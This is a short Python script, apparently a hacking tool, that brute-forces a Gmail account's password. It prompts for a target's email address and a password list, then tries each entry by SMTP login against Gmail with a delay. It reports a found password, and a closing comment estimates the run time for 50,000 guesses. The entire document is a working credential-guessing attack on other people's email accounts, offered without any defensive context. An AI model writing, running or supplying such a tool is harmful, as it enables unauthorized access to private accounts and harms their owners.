import smtplib
import time
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
n = 0 
user = input("Enter the target's email address: ")
passfile = input("Enter the password file name: ")
passfile = open(passfile, "r")
 
for password in passfile:
        try:
                smtpserver.login(user, password)
 
                print ("[+] Password Found: %s" % password)
                break;
        except smtplib.SMTPAuthenticationError:
            print(n + 1)
            print("Incorect password: " + password)
            n += 1
            time.sleep(5)
          
                
                 
     
#70hr for 50k passwords  
